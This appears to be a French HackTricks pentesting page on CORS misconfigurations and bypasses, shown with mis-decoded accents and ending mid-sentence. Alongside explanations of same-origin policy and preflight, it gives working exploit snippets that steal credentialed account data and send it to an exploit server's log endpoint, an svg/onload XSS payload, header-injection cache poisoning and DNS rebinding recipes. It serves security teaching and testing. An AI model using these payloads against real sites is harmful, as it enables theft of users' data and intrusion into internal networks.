# CORS - Mauvaises configurations et contournement

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Qu'est-ce que CORS ?

La norme CORS (partage de ressources entre origines multiples) est n√©cessaire car elle **permet aux serveurs de sp√©cifier qui peut acc√©der √† ses ressources** et quelles **m√©thodes de requ√™te HTTP sont autoris√©es** √† partir de ressources externes.

Une politique de **m√™me origine** exige que le **serveur demandeur** d'une ressource et le serveur o√π se trouve la **ressource** utilisent le m√™me protocole ([http://), nom de domaine](http://\), nom de domaine) et le m√™me **port** (80). Ensuite, si le serveur force la politique de m√™me origine, seules les pages web du m√™me domaine et du m√™me port pourront acc√©der aux ressources.

Le tableau suivant montre comment la politique de m√™me origine sera appliqu√©e dans `http://normal-website.com/example/example.html` :

| URL acc√©d√©e                               | Acc√®s autoris√© ?                   |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | Oui : m√™me sch√©ma, domaine et port |
| `http://normal-website.com/example2/`     | Oui : m√™me sch√©ma, domaine et port |
| `https://normal-website.com/example/`     | Non : sch√©ma et port diff√©rents    |
| `http://en.normal-website.com/example/`   | Non : domaine diff√©rent            |
| `http://www.normal-website.com/example/`  | Non : domaine diff√©rent            |
| `http://normal-website.com:8080/example/` | Non : port diff√©rent\*             |

\*_Internet Explorer autorisera cet acc√®s car IE ne prend pas en compte le num√©ro de port lors de l'application de la politique de m√™me origine._

### En-t√™te `Access-Control-Allow-Origin`

La sp√©cification de `Access-Control-Allow-Origin` permet **plusieurs origines**, ou la valeur **`null`**, ou le joker **`*`**. Cependant, **aucun navigateur ne prend en charge plusieurs origines** et il y a des **restrictions** sur l'utilisation du **joker** `*`. (_Le joker ne peut √™tre utilis√© seul, cela √©chouera `Access-Control-Allow-Origin: https://*.normal-website.com` et il ne peut pas √™tre utilis√© avec_ _Access-Control-Allow-Credentials: true_)

Cet en-t√™te est **renvoy√© par un serveur** lorsqu'un site Web demande une ressource inter-domaines, avec un en-t√™te `Origin` ajout√© par le navigateur.

### En-t√™te `Access-Control-Allow-Credentials`

Le comportement **par d√©faut** des demandes de ressources inter-domaines est que les **demandes** sont **transmises sans informations d'identification** telles que les cookies et l'en-t√™te d'autorisation. Cependant, le serveur inter-domaines peut **autoriser la lecture** de la **r√©ponse** lorsque les **informations d'identification** sont **transmises** en d√©finissant l'en-t√™te CORS **`Access-Control-Allow-Credentials`** sur **`true`**.

Si la valeur est d√©finie sur `true`, le navigateur enverra des informations d'identification (cookies, en-t√™tes d'autorisation ou certificats client TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
        console.log(xhr.responseText);
    }
}
xhr.open('GET', 'http://example.com/', true); 
xhr.withCredentials = true; 
xhr.send(null);
```

```javascript
fetch(url, {
  credentials: 'include'  
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### Requ√™te pr√©alable

Dans certaines circonstances, lorsqu'une requ√™te entre domaines est :

* inclut une **m√©thode HTTP non standard (HEAD, GET, POST)**
* inclut de nouveaux **en-t√™tes**
* inclut une valeur d'en-t√™te **Content-Type sp√©ciale**

{% hint style="info" %}
**V√©rifiez** [**dans ce lien**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) **les conditions d'une requ√™te pour √©viter l'envoi d'une requ√™te pr√©alable**
{% endhint %}

la requ√™te entre domaines est pr√©c√©d√©e d'une **requ√™te** utilisant la m√©thode **`OPTIONS`**, et le protocole CORS n√©cessite une v√©rification initiale des **m√©thodes et des en-t√™tes autoris√©s avant de permettre la requ√™te entre domaines**. Cela s'appelle la **v√©rification pr√©alable**. Le serveur **renvoie une liste de m√©thodes autoris√©es** en plus de l'**origine de confiance** et le navigateur v√©rifie si la m√©thode demand√©e par le site Web est autoris√©e.

{% hint style="danger" %}
Notez que **m√™me si une requ√™te pr√©alable n'est pas envoy√©e** parce que les conditions de la "requ√™te r√©guli√®re" sont respect√©es, la **r√©ponse doit avoir les en-t√™tes d'autorisation** ou le **navigateur ne pourra pas lire la r√©ponse** de la requ√™te.
{% endhint %}

Par **exemple**, ceci est une requ√™te pr√©alable qui cherche √† **utiliser la m√©thode `PUT`** avec un **en-t√™te de requ√™te personnalis√©** appel√© `Special-Request-Header`:
```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```
Le serveur pourrait renvoyer une r√©ponse comme celle-ci :
```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* `Access-Control-Allow-Headers` : Les en-t√™tes autoris√©s
* `Access-Control-Expose-Headers` : Les en-t√™tes expos√©s
* `Access-Control-Max-Age` : D√©finit une dur√©e maximale pour mettre en cache la r√©ponse pr√©alable pour une r√©utilisation ult√©rieure
* `Access-Control-Request-Headers` : L'en-t√™te que la requ√™te cross-origin souhaite envoyer
* `Access-Control-Request-Method` : La m√©thode que la requ√™te cross-origin souhaite utiliser
* `Origin` : Origine de la requ√™te cross-origin (d√©finie automatiquement par le navigateur)

![](../.gitbook/assets/preflight.svg)

Notez que g√©n√©ralement (selon le type de contenu et les en-t√™tes d√©finis), dans une requ√™te **GET/POST, aucune requ√™te pr√©alable n'est envoy√©e** (la requ√™te est envoy√©e **directement**), mais si vous voulez acc√©der aux **en-t√™tes/corps de la r√©ponse**, elle doit contenir un en-t√™te _Access-Control-Allow-Origin_ qui l'autorise.\
**Par cons√©quent, CORS ne prot√®ge pas contre les attaques CSRF (mais peut √™tre utile).**

### **Requ√™te pr√©alable pour les requ√™tes de r√©seau local**

Lorsqu'une requ√™te est envoy√©e √† une adresse IP de r√©seau local, 2 en-t√™tes CORS suppl√©mentaires sont envoy√©s :

* L'en-t√™te de requ√™te client `Access-Control-Request-Local-Network` indique que la requ√™te est une requ√™te de r√©seau local
* L'en-t√™te de r√©ponse serveur `Access-Control-Allow-Local-Network` indique qu'une ressource peut √™tre partag√©e en toute s√©curit√© avec des r√©seaux externes

Une **r√©ponse valide autorisant la requ√™te de r√©seau local** doit √©galement contenir dans la r√©ponse l'en-t√™te `Access-Controls-Allow-Local_network: true` :
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://public.example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Notez que l'adresse IP linux **0.0.0.0** fonctionne pour **contourner** ces exigences pour acc√©der √† localhost car cette adresse IP n'est pas consid√©r√©e comme "locale".

Il est √©galement possible de **contourner les exigences du r√©seau local** si vous utilisez l'**adresse IP publique d'un point de terminaison local** (comme l'adresse IP publique du routeur). Car dans plusieurs cas, m√™me si l'**adresse IP publique** est utilis√©e, si elle est **du r√©seau local**, l'acc√®s sera autoris√©.


{% endhint %}

## Configurations mal configur√©es exploitables

Notez que la plupart des **attaques r√©elles n√©cessitent que `Access-Control-Allow-Credentials`** soit d√©fini sur **`true`** car cela permettra au navigateur d'envoyer les informations d'identification et de lire la r√©ponse. Sans informations d'identification, de nombreuses attaques deviennent sans objet ; cela signifie que vous ne pouvez pas utiliser les cookies d'un utilisateur, il n'y a donc souvent rien √† gagner en faisant en sorte que leur navigateur √©mette la demande plut√¥t que de l'√©mettre vous-m√™me.

Une exception notable est lorsque l'emplacement r√©seau de la **victime fonctionne comme une sorte d'authentification**. Vous pouvez utiliser le navigateur d'une victime comme proxy pour contourner l'authentification bas√©e sur l'adresse IP et acc√©der aux applications intranet. En termes d'impact, cela est similaire au rebinding DNS, mais beaucoup moins compliqu√© √† exploiter.

### R√©flexion de l'`Origin` dans `Access-Control-Allow-Origin`

Dans le monde r√©el, cela ne peut pas arriver car **ces 2 valeurs des en-t√™tes sont interdites ensemble**.\
Il est √©galement vrai que de nombreux d√©veloppeurs veulent **autoriser plusieurs URL dans le CORS**, mais les jokers de sous-domaine ou les listes d'URL ne sont pas autoris√©s. Ensuite, plusieurs d√©veloppeurs **g√©n√®rent** l'en-t√™te \*\*`Access-Control-Allow-Origin`\*\* **dynamiquement**, et √† plus d'une occasion, ils copient simplement la valeur de l'en-t√™te Origin.

Dans ce cas, la **m√™me vuln√©rabilit√© pourrait √™tre exploit√©e.**

Dans d'autres cas, le d√©veloppeur pourrait v√©rifier que le **domaine** (_victimdomain.com_) **appara√Æt** dans l'en-t√™te **Origin**, puis, un attaquant peut utiliser un domaine appel√© **`attackervictimdomain.com`** pour voler les informations confidentielles.
```html
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://acc21f651fde5631c03665e000d90048.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script>
```
### L'origine `null`

`null` est une valeur sp√©ciale pour l'en-t√™te **Origin**. La sp√©cification mentionne qu'elle est d√©clench√©e par des redirections et des fichiers HTML locaux. Certaines applications peuvent autoriser l'origine `null` pour prendre en charge le d√©veloppement local de l'application.\
C'est pratique car **plusieurs applications autoriseront cette valeur** dans le CORS et **n'importe quel site web peut facilement obtenir l'origine null en utilisant un iframe sandboxed** :
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```
### **Bypasses Regexp**

Si vous avez trouv√© que le domaine _victim.com_ est **whitelisted**, vous devriez v√©rifier si _victim.com.**attacker.com**_ est √©galement **whitelisted**, ou, dans le cas o√π vous pouvez **prendre le contr√¥le de certains sous-domaines**, v√©rifiez si _**somesubdomain**.victim.com_ est whitelisted.

### **Bypasses Regexp avanc√©s**

La plupart des regex utilis√©es pour identifier le domaine √† l'int√©rieur de la cha√Æne se concentreront sur les caract√®res alphanum√©riques ASCII et `.-`. Ensuite, quelque chose comme `victimdomain.com{.attacker.com` √† l'int√©rieur de l'en-t√™te Origin sera interpr√©t√© par la regexp comme si le domaine √©tait `victimdomain.com`, mais le navigateur (dans ce cas Safari prend en charge ce caract√®re dans le domaine) acc√©dera au domaine `attacker.com`.

Le caract√®re `_` (dans les sous-domaines) est non seulement pris en charge dans Safari, mais √©galement dans Chrome et Firefox!

**Ensuite, en utilisant l'un de ces sous-domaines, vous pourriez contourner certaines regex "communes" pour trouver le domaine principal d'une URL.**

**Pour plus d'informations et de param√®tres sur ce contournement, consultez:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **et** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![](<../.gitbook/assets/image (153).png>)

### Depuis XSS √† l'int√©rieur d'un sous-domaine

Un m√©canisme de d√©fense que les d√©veloppeurs utilisent contre l'exploitation de CORS est de mettre en liste blanche les domaines qui demandent fr√©quemment l'acc√®s aux informations. Cependant, ce n'est pas enti√®rement s√©curis√©, car si m√™me **un** des sous-domaines du domaine **whitelisted** est **vuln√©rable** √† d'autres exploits tels que **XSS**, cela peut permettre l'exploitation de CORS.

Prenons un exemple, le code suivant montre la configuration qui permet aux sous-domaines de _requester.com_ d'acc√©der aux ressources de _provider.com_.
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com')
 {
  //Access data
  else{ // unauthorized access}
}
```
En supposant qu'un utilisateur ait acc√®s √† sub.requester.com mais pas √† requester.com, et en supposant que `sub.requester.com` est vuln√©rable √† XSS. L'utilisateur peut exploiter `provider.com` en utilisant la m√©thode d'attaque par script intersite.

### **Empoisonnement du cache c√¥t√© serveur**

Si les √©toiles sont align√©es, nous pourrions utiliser l'empoisonnement du cache c√¥t√© serveur via l'injection d'en-t√™te HTTP pour cr√©er une vuln√©rabilit√© [XSS stock√©e](https://portswigger.net/web-security/cross-site-scripting/stored).

Si une application **refl√®te** l'en-t√™te **Origin** sans m√™me le v√©rifier pour des caract√®res ill√©gaux comme `,` nous avons effectivement une vuln√©rabilit√© d'injection d'en-t√™te HTTP contre les utilisateurs IE/Edge car Internet Explorer et Edge consid√®rent \r (0x0d) comme un terminateur d'en-t√™te HTTP valide : `GET / HTTP/1.1`\
`Origin: z[0x0d]Content-Type: text/html; charset=UTF-7`

Internet Explorer voit la r√©ponse comme :

`HTTP/1.1 200 OK`\
`Access-Control-Allow-Origin: z`\
`Content-Type: text/html; charset=UTF-7`

Ce n'est pas directement exploitable car il n'y a aucun moyen pour un attaquant de faire envoyer un en-t√™te malform√© √† un navigateur web, mais je peux **manuellement cr√©er cette requ√™te dans Burp Suite et un cache c√¥t√© serveur peut enregistrer la r√©ponse et la servir √† d'autres personnes**. La charge utile que j'ai utilis√©e changera l'ensemble de caract√®res de la page en **UTF-7**, ce qui est notoirement utile pour cr√©er des vuln√©rabilit√©s XSS.

### **Empoisonnement du cache c√¥t√© client**

Vous avez peut-√™tre d√©j√† rencontr√© une page avec un [XSS r√©fl√©chi](https://portswigger.net/web-security/cross-site-scripting/reflected) dans un en-t√™te HTTP personnalis√©. Disons qu'une page web refl√®te le contenu d'un en-t√™te personnalis√© sans l'encoder :
```http
GET / HTTP/1.1  
Host: example.com  
X-User-id: &lt;svg/onload=alert\(1\)&gt;

HTTP/1.1 200 OK  
Access-Control-Allow-Origin: \*  
Access-Control-Allow-Headers: X-User-id  
Content-Type: text/html  
...  
Invalid user: &lt;svg/onload=alert\(1\)&gt;\
```
Avec CORS, nous pouvons envoyer n'importe quelle valeur dans l'en-t√™te. En soi, cela est inutile car la r√©ponse contenant notre JavaScript inject√© ne sera pas rendue. Cependant, si "Vary: Origin" n'a pas √©t√© sp√©cifi√©, la r√©ponse peut √™tre stock√©e dans le cache du navigateur et affich√©e directement lorsque le navigateur acc√®de √† l'URL associ√©e. J'ai cr√©√© un fiddle pour [tenter cette attaque sur une URL de votre choix](https://jsfiddle.net/3gk8u8wu/3/). √âtant donn√© que cette attaque utilise la mise en cache c√¥t√© client, elle est en fait assez fiable.
```markup
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // beware of mixed content blocking when targeting HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")
req.send();
</script>
```
## Contournement

### XSSI (Inclusion de script entre sites) / JSONP

XSSI d√©signe une sorte de vuln√©rabilit√© qui exploite le fait que, lorsqu'une ressource est incluse √† l'aide de la balise `script`, la SOP ne s'applique pas, car les scripts doivent pouvoir √™tre inclus entre domaines. Un attaquant peut ainsi lire tout ce qui a √©t√© inclus √† l'aide de la balise `script`.

Cela est particuli√®rement int√©ressant en ce qui concerne le JavaScript dynamique ou JSONP, lorsque des informations d'autorit√© ambiante telles que les cookies sont utilis√©es pour l'authentification. Les cookies sont inclus lors de la demande d'une ressource √† partir d'un h√¥te diff√©rent. Plugin BurpSuite : [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp)

[**En savoir plus sur les diff√©rents types de XSSI et comment les exploiter ici.**](xssi-cross-site-script-inclusion.md)

Essayez d'ajouter un **param√®tre de rappel** (**`callback`**) dans la requ√™te. Peut-√™tre que la page √©tait pr√©par√©e pour envoyer les donn√©es sous forme de JSONP. Dans ce cas, la page renverra les donn√©es avec `Content-Type: application/javascript`, ce qui contournera la politique CORS.

![](<../.gitbook/assets/image (229).png>)

### Contournement facile (inutile ?)

Vous pouvez demander √† une application web de faire une demande pour vous et de renvoyer la r√©ponse. Cela contournera le **`Access-Control-Allow-Origin`**, mais notez que les **informations d'identification de la victime finale ne seront pas envoy√©es** car vous **contacterez un domaine diff√©rent** (celui qui fera la demande pour vous).

[**CORS-escape**](https://github.com/shalvah/cors-escape)

CORS-escape fournit un **proxy** qui **transmet** notre **requ√™te** ainsi que ses **en-t√™tes**, et il **falsifie** √©galement l'en-t√™te **Origin** (Origin = **domaine demand√©**). Ainsi, la **politique CORS est contourn√©e**.\
Le code source est [sur Github](https://github.com/shalvah/cors-escape), vous pouvez donc **h√©berger le v√¥tre**.
```javascript
xhr.open("GET", "https://cors-escape.herokuapp.com/https://maximum.blog/@shalvah/posts");
```
[**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape)

La mise en place d'un proxy est un peu comme "transmettre" votre demande, exactement comme vous l'avez envoy√©e. Nous pourrions r√©soudre cela d'une mani√®re alternative qui implique toujours que quelqu'un d'autre fasse la demande pour vous, mais cette fois, **au lieu de transmettre votre demande, le serveur fait sa propre demande, mais avec les param√®tres que vous avez sp√©cifi√©s.**

### Contournement Iframe + Popup

Vous pouvez **contourner les v√©rifications CORS** telles que `e.origin === window.origin` en **cr√©ant un iframe** et **en ouvrant une nouvelle fen√™tre** √† partir de celui-ci. Plus d'informations sur la page suivante :

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding via TTL

![](<../.gitbook/assets/image (108).png>)

Essentiellement, vous faites **acc√©der la victime √† votre page**, puis vous changez le **DNS de votre domaine (l'IP)** et le faites **pointer** vers la **page web de votre victime**. Vous faites ex√©cuter quelque chose √† votre **victime** (**JS**) lorsque le **TTL est termin√©**, de sorte qu'une nouvelle demande DNS sera effectu√©e et que vous pourrez alors recueillir les informations (comme vous maintenez toujours **l'utilisateur dans votre domaine**, il n'enverra **aucun cookie** au serveur de la victime, donc cette option **abuse des privil√®ges sp√©ciaux de l'IP de la victime**).

M√™me si vous d√©finissez le **TTL tr√®s bas** (0 ou 1), les **navigateurs ont un cache** qui vous **emp√™chera** d'**abuser** de cela pendant plusieurs secondes/minutes.

Ainsi, cette technique est utile pour **contourner les v√©rifications explicites** (la victime **effectue explicitement une demande DNS** pour v√©rifier l'IP du domaine et lorsque le bot est appel√©, il fera le sien).

Ou lorsque vous pouvez avoir un **utilisateur/bot sur la m√™me page pendant une longue p√©riode** (vous pouvez donc **attendre** que le **cache expire**).

Si vous avez besoin de quelque chose de rapide pour abuser de cela, vous pouvez utiliser un service comme [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Si vous voulez ex√©cuter votre propre serveur de rebinding DNS, vous pouvez utiliser quelque chose comme [**DNSrebinder**](https://github.com/mogwailabs/DNSrebinder)**,** puis **exposer** votre **port local 53/udp**, cr√©er un **registre A pointant vers celui-ci** (ns.example.com), et cr√©er un **registre NS** pointant vers le **sous-domaine A pr√©c√©demment cr√©√©** (ns.example.com).\
Ensuite, tout sous-domaine de ce sous-domaine (ns.example.com) sera r√©solu par votre h√¥te.

Consultez √©galement le **serveur en cours d'ex√©cution publiquement dans** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

### DNS Rebinding via **DNS Cache Flooding**

Comme expliqu√© dans la section pr√©c√©dente, les **navigateurs** ont les adresses IP des domaines **mises en cache plus longtemps** que celle sp√©cifi√©e dans le TTL. Cependant, il existe un moyen de contourner cette d√©fense.

Vous pouvez avoir un **service worker qui inondera le cache DNS pour forcer une deuxi√®me demande DNS**. Ainsi, le flux sera comme suit :

1. La demande DNS a r√©pondu avec l'adresse de l'attaquant
2. Le service worker inonde le cache DNS (le nom de serveur attaquant mis en cache est supprim√©)
3. Deuxi√®me demande DNS cette fois a r√©pondu avec 127.0.0.1

![](<../.gitbook/assets/image (375) (1).png>)

_Le bleu est la premi√®re demande DNS et l'orange est l'inondation._

### DNS Rebinding via **Cache**

Comme expliqu√© dans la section pr√©c√©dente, les **navigateurs** ont les adresses IP des domaines **mises en cache plus longtemps** que celle sp√©cifi√©e dans le TTL. Cependant, il existe un autre moyen de contourner cette d√©fense.

Vous pouvez **cr√©er 2 enregistrements A** (ou **1 avec 2 IPs**, selon le fournisseur) pour le **m√™me sous-domaine** dans le **fournisseur DNS** et lorsque le navigateur les v√©rifie, il les obtiendra tous les deux.

Maintenant, si le **navigateur** d√©cide d'**utiliser l'adresse IP de l'attaquant en premier**, l'**attaquant** pourra **servir la charge utile** qui **effectuera des demandes HTTP** vers le m√™me **domaine**. Cependant, maintenant que l'attaquant conna√Æt l'IP de la victime, **il cessera de r√©pondre au navigateur de la victime**.

Lorsque le navigateur constate que le **domaine ne lui r√©pond pas**, il **utilisera la deuxi√®me IP donn√©e**, donc il **acc√©dera √† un endroit diff√©rent en contournant SOP**. L'attaquant peut en profiter pour **obtenir les informations et les exfiltrer**.

{% hint style="warning" %}
Notez que pour acc√©der √† localhost, vous devriez essayer de r√©associer **127.0.0.1** dans Windows et **0.0.0.0** dans Linux.\
Des fournisseurs tels que Godaddy ou Cloudflare ne m'ont pas permis d'utiliser l'adresse IP 0.0.0.0, mais AWS route53 m'a permis de cr√©er un enregistrement A avec 2 IPs dont l'une √©tait "0.0.0.0"

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

![](<../.gitbook/assets/image (620) (4).png>)

Pour plus d'informations, vous pouvez consulter [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### Autres contournements courants

* Si les **adresses IP internes ne sont pas autoris√©es**,
